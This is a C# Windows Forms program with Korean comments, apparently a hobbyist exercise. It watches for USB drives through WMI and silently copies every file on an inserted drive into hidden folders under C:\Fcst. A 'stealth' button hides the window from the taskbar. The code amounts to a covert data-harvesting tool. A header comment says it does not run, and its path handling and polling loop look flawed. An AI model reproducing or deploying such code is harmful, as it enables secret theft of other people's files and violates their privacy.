using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
/*
멍미! 실행안돼!!ㅋㅋㅋㅋㅋ

Form1_Load(object sender, EventArgs e) : USB를 감지하는 스레드를 실행
Form1_Closing(object sender, FormClosingEventArgs e) : 추가 실행된 스레드를 강제 종료
btnHide_Click(object sender, EventArgs e) : [스텔스] 버튼을 클릭할 때 발생하는 이벤트 제어, 폼을 숨김
nyiTray_DoubleClick(object sender, EventArgs e) : 폼을 보여주는 작업을 수행

※System.Management 참조추가
*/
namespace mook_USBFileCopy
{
    public partial class Form1 : Form
    {
        //멤버 개체와 변수
        const int RemovableDisk = 2;
        const int RamDisk = 6;

        bool Start = true;
        Thread DiskAdd = null;
        //ManagementObjectSearcher클래스 : 관리 정보에 대해 지정된 WMI 쿼리를 호출하는데 사용
        //쿼리문은 로컬 PC의 논리 디스크를 검색
        ManagementObjectSearcher Mquery = new ManagementObjectSearcher("SELECT * FROM Win32_logicalDisk");

        /*
        WMI : 거의 모든 Windows리소스를 액세스하고 구성하고 관리하고 모니터링 할 수 있는 수단이자 통로
        https://www.microsoft.com/korea/msdn/columns/contents/scripting/scripting06112002/
        */
        public Form1()
        {
            InitializeComponent();
        }

        //폼로딩 : 디스크를 모니터링하는 스레드를 생성
        private void Form1_Load(object sender, EventArgs e)
        {
            DiskAdd = new Thread(DiskUpdate);
            DiskAdd.Start();
        }

        //WMI 쿼리를 이용하여 로컬디스크를 실시간으로 모니터링, USB가 추가되면 디스크를 추가하는 작업 수행
        private void DiskUpdate()
        {
            ManagementObjectCollection bqueryCollection = Mquery.Get(); //로컬 디스크 정보를 검색하는 지정된 WMI 쿼리(== SELECT * FROM Win32_LogicalDisk)를
                                                                        //호출하고 결과 컬렉션을 반환, 디스크 정보를 가져와 ManagementObjectCollection개체에 저장
            #region 루프를 반복하며 디스크가 추가되는 것을 실시간으로 감지
            while (Start)
            {
                //실시간으로  WMI쿼리를 호출하면서 변경된 최신 디스크 정보를 검색하여 변수에 저장
                ManagementObjectSearcher query = new ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk");
                ManagementObjectCollection aqueryCollection = query.Get();
                //만약 처음의 로컬PC의 정보(bqueryCollection)와 실시간으로 새로 검색한 정보(aqueryCollection)가 일치하지 않는다면
                if (aqueryCollection.Count != bqueryCollection.Count)
                {
                    Start = false;
                    //최신 WMI 쿼리 호출결과를 변수 및 컬렉션에 저장
                    Mquery = query;
                    bqueryCollection = aqueryCollection;
                    DiskSelect(); //새로 추가된 디스크가 USB 디스크인지 검색하여 디스크 경로를 반환하는 메서드를 호출하는 구문
                }
            } 
            #endregion
        }

        //추가된 디스크가 RemovableDisk인지 여부를 확인하여 USB 디스크이면 디스크 경로를 OnDriveArrived() 메서드에 넘겨주는 작업 수행
        private void DiskSelect()
        {
            ManagementObjectCollection queryCollection = Mquery.Get();
            foreach(ManagementBaseObject drive in queryCollection)
            {
                switch (Convert.ToInt32(drive["DriveType"].ToString()))
                {
                    case RemovableDisk: //만약 usb드라이브라면
                        OnDriveArrived(drive["Name"].ToString()); //OnDriveArrived메서드에 디스크 경로를 인자값으로 입력, 호출
                        break;
                }
            }
            Start = true;
        }

        //스레드를 생성하고 실제 USB 내에 있는 파일을 복사하는 copysubFolder() 메서드를 호출하는 작업 수행
        private void OnDriveArrived(string diskpath)
        {
            var ThreadUsbCopy = new Thread(new ParameterizedThreadStart(copysubFolder)); //파라미터 있는 외부 스레드
            //스레드 인자값으로 USB디스크 경로 및 파일이 저장될 경로를 대입
            //이 정보는 copysubFolder()메서드에서 ?구분자를 통해 분리되어 사용
            ThreadUsbCopy.Start(diskpath + @"\\" + "?" + @"C:\\Fcst" + @"\\" + DateTime.Now.ToLongDateString().Replace(':', '.'));            
        }

        //USB에 저장된 파일을  PC에 복사하는 작업
        private void copysubFolder(object copyInfo)
        {
            try
            {
                string[] copyString = Convert.ToString(copyInfo).Split('?');
                string copyFrom = copyString[0]; //복사할 파일 대상 경로
                string copyTo = copyString[1]; //복사된 파일이 저장될 경로
                DirectoryInfo fromDir = new DirectoryInfo(copyFrom); //복사할 파일의 대상 경로의 폴더 정보 가져오기
                DirectoryInfo toDir = new DirectoryInfo(copyTo);
                DirectoryInfo[] fromDirs = null;

                toDir.Create(); //복사되는 파일이 저장될 최상위 경로 생성
                toDir.Attributes = FileAttributes.Hidden; //폴더는 Hidden으로 저장
                fromDirs = fromDir.GetDirectories(); //하위 디렉터리 정보 가져오기

                FileInfo[] fromFile = fromDir.GetFiles(); //파일정보를 가져온다

                for (int i = 0; i < fromFile.Length; i++)
                {
                    fromFile[i].CopyTo(toDir.ToString() + @"\\" + fromFile[i].Name);
                    File.SetAttributes(toDir.ToString() + @"\\" + fromFile[i].Name, FileAttributes.Hidden);
                }

                for (int i = 0; i < fromDirs.Length; i++) //하위디렉토리도 반복한다 이게 재귀?
                {
                    copysubFolder(fromDirs[i].FullName + "?" + copyTo + @"\\" + fromDirs[i].Name);
                }
            }
            catch (Exception) { return; }
        }

        //VisibleChange()메소드를 호출하여 폼을 숨기는 작업 수행
        private void btnHide_Click(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;
            this.ShowIcon = false;
            VisibleChange(false, true);
        }

        //폼의 Visible, nyiTray 컨트롤의 Visible 속성을 설정하는 작업을 수행, 이는 폼을 숨길지 나타낼지 선택하는 구문
        private void VisibleChange(bool FormVisible, bool TrayIconVisible)
        {
            this.Visible = FormVisible;
            this.nyiTray.Visible = TrayIconVisible;
        }

        //트레이 아이콘을 더블클릭하면 폼을 보이는 작업을 수행
        private void nyiTray_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            VisibleChange(true, false);
            this.ShowInTaskbar = true;
            this.ShowIcon = true;
        }

        //DiskAdd 스레드가 실행되고 있으면 강제종료하고 폼종료
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (DiskAdd != null) DiskAdd.Abort();
            Application.ExitThread();
        }
    }
}
